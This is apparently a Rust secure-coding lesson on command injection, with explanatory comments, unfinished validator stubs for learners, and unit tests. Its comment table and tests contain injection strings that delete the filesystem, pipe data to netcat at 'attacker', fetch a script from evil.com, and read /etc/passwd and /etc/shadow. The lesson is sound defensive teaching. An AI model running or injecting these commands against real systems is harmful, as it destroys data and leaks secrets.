//! # Lesson 03: Command Injection
//!
//! ## The Problem
//!
//! Command injection occurs when user input is passed to a system shell
//! (via `sh -c`, `system()`, `exec()`, etc.) without proper sanitization.
//! Attackers can inject additional commands using shell metacharacters.
//!
//! ```ignore
//! // VULNERABLE: Passing user input to shell
//! let filename = user_input; // e.g., "file.txt; rm -rf /"
//! std::process::Command::new("sh")
//!     .args(["-c", &format!("cat {}", filename)])
//!     .output();
//! // Executes: cat file.txt; rm -rf /
//! ```
//!
//! ## Shell Metacharacters
//!
//! These characters have special meaning in shells and can be used for injection:
//!
//! | Character | Meaning             | Injection Example              |
//! |-----------|---------------------|--------------------------------|
//! | `;`       | Command separator   | `file.txt; rm -rf /`           |
//! | `\|`      | Pipe                | `file.txt \| nc attacker 80`   |
//! | `&`       | Background/AND      | `file.txt & wget evil.com/sh`  |
//! | `$()`     | Command substitution| `$(cat /etc/passwd)`           |
//! | `` ` ` `` | Command substitution| `` `cat /etc/passwd` ``        |
//! | `>`       | Redirect output     | `x > /etc/crontab`             |
//! | `<`       | Redirect input      | `x < /etc/shadow`              |
//! | `\n`      | Newline (new cmd)   | `file.txt\nrm -rf /`           |
//!
//! ## Defense: Avoid the Shell Entirely
//!
//! The best defense is to **never** invoke a shell with user input. Use
//! `std::process::Command` with explicit arguments instead:
//!
//! ```ignore
//! // SAFE: Direct exec, no shell interpretation
//! std::process::Command::new("cat")
//!     .arg(filename)
//!     .output();
//! ```
//!
//! When you must validate input for a command, use a strict allowlist.

/// Shell metacharacters that could enable command injection.
const SHELL_META_CHARS: &[char] = &[
    ';', '|', '&', '$', '`', '(', ')', '{', '}', '[',
    ']', '#', '\n', '\r', '\\', '\'', '"', '>', '<', '!',
    '*', '?', '~', '\0',
];

/// Check if a string contains any shell metacharacters.
pub fn contains_shell_metachars(input: &str) -> bool {
    todo!("Check for shell metacharacters")
}

/// Validate a filename for safe use as a command argument.
///
/// A safe filename:
/// - Is non-empty
/// - Contains only alphanumeric chars, dots, hyphens, underscores, and spaces
/// - Does not start with a hyphen (to prevent flag injection)
/// - Does not contain path separators (/ or \\)
/// - Does not contain null bytes
///
/// Returns Ok(filename) if safe, Err(message) if dangerous.
pub fn validate_command_argument(input: &str) -> Result<&str, String> {
    todo!("Validate filename for command argument safety")
}

/// A safe command builder that never invokes a shell.
///
/// Wraps `std::process::Command` and enforces argument validation.
pub struct SafeCommand {
    program: String,
    args: Vec<String>,
}

impl SafeCommand {
    /// Create a new safe command with the given program.
    ///
    /// The program name must be a simple name (no path separators, no
    /// shell metacharacters).
    pub fn new(program: &str) -> Result<Self, String> {
        todo!("Validate program name and create SafeCommand")
    }

    /// Add a validated argument.
    ///
    /// Rejects arguments containing shell metacharacters.
    /// Rejects arguments starting with `--` followed by unexpected flags
    /// (allows common patterns like `-v`, `--help`).
    pub fn arg(mut self, arg: &str) -> Result<Self, String> {
        todo!("Validate and add argument")
    }

    /// Build the command string that would be executed.
    ///
    /// This is for inspection only -- the actual execution should use
    /// `std::process::Command::new(&self.program).args(&self.args)`.
    pub fn to_command_string(&self) -> String {
        let args: Vec<&str> = self.args.iter().map(|s| s.as_str()).collect();
        format!("{} {}", self.program, args.join(" "))
    }
}

/// Detect potential command injection in user input.
///
/// Checks for:
/// - Shell metacharacters
/// - Newline-based command chaining
/// - Null bytes
/// - Common dangerous patterns (e.g., `/bin/sh`, `bash -c`, `eval`)
pub fn detect_command_injection(input: &str) -> bool {
    todo!("Detect command injection patterns")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_filename() {
        assert!(validate_command_argument("report.txt").is_ok());
    }

    #[test]
    fn test_reject_semicolon() {
        assert!(validate_command_argument("file.txt; rm -rf /").is_err());
    }

    #[test]
    fn test_reject_pipe() {
        assert!(validate_command_argument("file | nc evil 80").is_err());
    }

    #[test]
    fn test_reject_path_traversal() {
        assert!(validate_command_argument("../../etc/passwd").is_err());
    }

    #[test]
    fn test_reject_leading_hyphen() {
        assert!(validate_command_argument("-rf").is_err());
    }

    #[test]
    fn test_reject_null_byte() {
        assert!(validate_command_argument("file.txt\0.exe").is_err());
    }

    #[test]
    fn test_safe_command_basic() {
        let cmd = SafeCommand::new("cat").unwrap().arg("file.txt").unwrap();
        assert_eq!(cmd.to_command_string(), "cat file.txt");
    }

    #[test]
    fn test_safe_command_rejects_shell_metachar() {
        let result = SafeCommand::new("cat")
            .unwrap()
            .arg("file.txt; echo pwned");
        assert!(result.is_err());
    }

    #[test]
    fn test_detect_injection_subshell() {
        assert!(detect_command_injection("$(cat /etc/passwd)"));
    }
}
